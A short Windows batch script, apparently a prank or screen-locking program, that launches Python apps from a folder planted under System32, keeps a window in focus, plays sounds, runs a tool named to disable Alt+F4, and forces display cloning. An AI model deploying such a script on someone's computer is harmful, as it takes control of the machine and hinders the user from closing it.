@echo off

cd C:/Windows/System32/poopApp

START pythonw App.pyw &
START pythonw keepInFocus.pyw &

cd rsc/dist/media
CALL SoundPlayer.bat

cd ../win64

:: CALL importEscapeOFF.bat
CALL setChanges.bat &
START disableAltF4.exe

cd C:/Windows/System32/
DisplaySwitch.exe /clone